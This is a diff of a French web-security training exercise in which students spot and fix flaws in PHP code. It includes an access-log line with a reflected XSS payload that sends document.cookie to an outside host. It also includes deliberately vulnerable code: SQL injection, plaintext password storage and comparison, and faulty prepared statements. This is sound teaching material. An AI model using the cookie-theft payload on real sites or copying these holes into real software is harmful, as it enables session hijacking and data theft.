@@ -6,6 +6,40 @@ Votre application est composée de HTML, CSS, JavaScript et PHP.
 
 La suite de l'exercice vous demandera d'identifier les failles de sécurité et de les corriger.
 
+## Faille 0
+
+Observer les logs d'accès à votre application :
+
+```
+127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] "GET /apache_pb.gif HTTP/1.0" 200 2326
+127.0.0.1 - frank [10/Oct/2024:13:55:36 -0700] "GET /favicon.ico HTTP/1.0" 404 209
+192.168.1.1 - - [10/Oct/2024:13:55:36 -0700] "GET /index.html HTTP/1.0" 200 2761
+192.168.1.4 - - [10/Oct/2024:13:55:36 -0700] "GET /search.php?query=<script>document.location='http://192.168.1.4.com/?c='+document.cookie</script> HTTP/1.0" 200 512
+192.168.1.2 - - [10/Oct/2024:13:55:36 -0700] "POST /form.php HTTP/1.0" 200 183
+192.168.1.3 - - [10/Oct/2024:13:55:36 -0700] "GET /secret.html HTTP/1.0" 403 289
+```
+
+Les logs vous semblent-ils suspects ? Si oui, pourquoi ?
+
+Corriger le code de la page `search.php` pour éviter cette faille.
+
+```php
+
+<?php
+$query = $_GET['query'];
+echo "Résultat de la recherche pour $query";
+$pdo->prepare("SELECT * FROM articles WHERE title LIKE '%?%'");
+$pdo->execute([$query]);
+$result = $pdo->fetchAll(PDO::FETCH_ASSOC);
+
+foreach ($result as $article) {
+    echo "<h2>$article['title']</h2>";
+    echo "<p>$article['content']</p>";
+}
+?>
+```
+
+
 ## Faille 1
 
 L'auditeur a trouvé une faille de type XSS (Cross Site Scripting). Il a réussi à afficher une boîte de dialogue sur le navigateur de l'utilisateur.
@@ -71,7 +105,8 @@ Le code source ou la faille se trouve est le suivant :
 ```php
 <?php
 
-$request = "SELECT * FROM users WHERE id = " . $_GET['id'];
+$id = $_GET['id'];
+$request = "SELECT * FROM users WHERE id = $id";
 $result = $pdo->query($request);
 $user = $result->fetch(PDO::FETCH_ASSOC);
 ?>
@@ -419,3 +454,127 @@ Pour corriger cette faille, d'autres solutions sont possibles :
 L'objectif est de limiter le nombre de tentatives de connexion. L'objectif est de ralentir l'attaque brute force.
 
 :::
+
+## Faille 12
+
+L'auditeur a trouvé une faille de type défaut de sécurisation de votre application. En effet lors de l'audit il découvre les enregistrements suivants en base de données :
+
+```
+=> SELECT * FROM users;
+
++----+----------+----------------------------------+
+| id | username | password                         |
++----+----------+----------------------------------+
+|  1 | admin    | adminSuperMotDePasse             |
+|  2 | user     | user                             |
+|  3 | root     | root                             |
++----+----------+----------------------------------+
+```
+
+Est-ce que vous voyez la potentielle faille de sécurité ?
+
+Le code de création d'un utilisateur est le suivant :
+
+```php
+<?php
+// Création d'un utilisateur
+$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
+$password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);
+
+$request = "INSERT INTO users (username, password) VALUES (?, ?)";
+$pdo->prepare($request)->execute([$username, $password]);
+
+?>
+```
+
+```php
+<?php
+// Vérification du mot de passe
+$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
+$password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);
+
+$request = "SELECT * FROM users WHERE username = ?";
+$pdo->prepare($request)->execute([$username]);
+
+$user = $pdo->fetch(PDO::FETCH_ASSOC);
+
+if ($user && $password === $user['password']) {
+    // Connexion réussie
+    // …
+}
+?>
+```
+
+Proposez une solution pour corriger cette faille.
+
+::: details Documentation
+
+Pour stocker un mot de passe, vous devez utiliser la fonction `password_hash()`.
+
+```php
+$password = password_hash($_POST['password'], PASSWORD_DEFAULT);
+```
+
+Pour vérifier un mot de passe, vous devez utiliser la fonction `password_verify()`.
+
+```php
+if (password_verify($_POST['password'], $user['password'])) {
+    // Le mot de passe est valide
+}
+```
+
+:::
+
+## Double authentification
+
+L'auditeur a trouvé une faille de sécurité dans votre application. Il vous demande de mettre en place une double authentification pour renforcer la sécurité de votre application.
+
+Il vous encourage à mettre en place une authentification à deux facteurs (2FA) de type matériel (une application mobile), pour cela il vous indique que vous pouvez utiliser le code de la librairie 2FAAuth. Celle-ci s'utilise de la manière suivante :
+
+```php
+$doubleAuth = new 2FAAuth("Nom de l'application");
+$user = User::findByLogin($login, $password);
+$doubleAuth->setUser($user);
+$code = $_POST['code'] ?? null;
+
+if($doubleAuth->isCodeValid($code)) {
+    // L'utilisateur est authentifié
+} else {
+    // L'utilisateur doit saisir le code 2FA
+}
+```
+
+Le code actuel de votre application est le suivant :
+
+### Page de login
+
+```html
+<form action="/login" method="post">
+    <input type="text" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <input type="submit" value="Login">
+</form>
+```
+
+### Page de gestion de l'authentification
+
+```php
+<?php
+
+// Page de gestion de l'authentification
+
+$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
+$password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);
+
+$user = User::findByLogin($username, $password);
+
+if ($user) {
+    header('Location: /dashboard');
+} else {
+    header('Location: /login');
+}
+
+die();
+```
+
+Proposez une solution pour mettre en place une double authentification dans votre application.
